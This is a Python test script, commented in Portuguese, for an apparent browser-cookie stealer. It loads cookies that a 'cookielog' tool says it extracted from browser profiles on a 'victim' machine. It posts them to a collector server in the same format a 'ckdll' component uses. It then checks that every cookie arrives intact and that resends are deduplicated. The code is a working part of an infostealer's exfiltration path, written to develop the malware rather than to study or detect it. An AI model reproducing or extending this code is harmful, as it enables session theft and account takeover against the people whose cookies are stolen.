#!/usr/bin/env python3
"""Test B: vitima real -> fio. Pega cookies_all.json (extraido por cookielog.py
nesta maquina) e entrega ao listen.py exatamente como o ckdll faz: um POST unico,
Content-Type application/json, X-CookieLog-Host, Connection: close."""
import json, socket, sys, time, urllib.request

HOST, PORT = "127.0.0.1", 9411
RUN = "VIC%d" % (int(time.time()) % 100000)


def post_raw(victim, rows, timeout=30):
    body = json.dumps(rows, ensure_ascii=False).encode("utf-8")
    head = ("POST / HTTP/1.1\r\nHost: 127.0.0.1:%d\r\nUser-Agent: Mozilla/5.0\r\n"
            "Accept: */*\r\nContent-Type: application/json\r\nContent-Length: %d\r\n"
            "Connection: close\r\nX-CookieLog-Host: %s\r\n\r\n" % (PORT, len(body), victim)).encode()
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    t0 = time.time()
    s.sendall(head + body)
    s.shutdown(socket.SHUT_WR)
    resp = b""
    while True:
        chunk = s.recv(65536)
        if not chunk:
            break
        resp += chunk
    s.close()
    return resp.split(b"\r\n", 1)[0].decode(errors="replace"), len(body), time.time() - t0


def get(path):
    with urllib.request.urlopen("http://%s:%d%s" % (HOST, PORT, path), timeout=10) as r:
        return json.loads(r.read())


def main():
    src = json.load(open(r"C:\Users\Dun\Documents\Codigos\tools\cookielog\cookies_all.json", encoding="utf-8"))
    src = [c for c in src if c.get("name") and c.get("domain") and c.get("name") != "password"]
    print("[vitima] %d cookies extraidos localmente" % len(src))

    st, nbytes, dt = post_raw(RUN, src)
    print("[fio] %s  %d bytes em %.2fs" % (st, nbytes, dt))
    if "200" not in st:
        sys.exit("POST falhou: " + st)

    got = [c for c in get("/all") if c.get("_host") == RUN]
    fails = []

    def check(name, cond, detail=""):
        print(("  PASS  " if cond else "  FAIL  ") + name + ("" if cond else "  <- " + str(detail)[:200]))
        if not cond:
            fails.append(name)

    check("todos os cookies chegaram", len(got) == len(src), "%d != %d" % (len(got), len(src)))

    # valor exato por (browser, profile, domain, name, path)
    def key(c):
        return (c.get("browser"), c.get("profile"), c.get("domain"), c.get("name"), c.get("path"))
    a = {key(c): c.get("value") for c in src}
    b = {key(c): c.get("value") for c in got}
    missing = [k for k in a if k not in b]
    diff = [k for k in a if k in b and a[k] != b[k]]
    check("nenhum registro perdido na identidade", not missing, missing[:3])
    check("valores identicos byte a byte", not diff, diff[:3])

    uni = [c for c in got if any(ord(ch) > 127 for ch in (c.get("value") or ""))]
    print("  [info] %d valores com caractere nao-ASCII sobreviveram" % len(uni))
    empty = [c for c in got if not c.get("value")]
    src_empty = [c for c in src if not c.get("value")]
    check("cookies v20 nao-decriptados preservados como vazio", len(empty) == len(src_empty),
          "%d vs %d" % (len(empty), len(src_empty)))

    # reenvio do mesmo dump nao deve inflar a colecao
    before = len(get("/all"))
    post_raw(RUN, src)
    after = len(get("/all"))
    check("reenvio do dump inteiro nao duplica", before == after, "%d -> %d" % (before, after))

    print("\n=== %d falhas ===" % len(fails))
    for f in fails:
        print("  - " + f)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
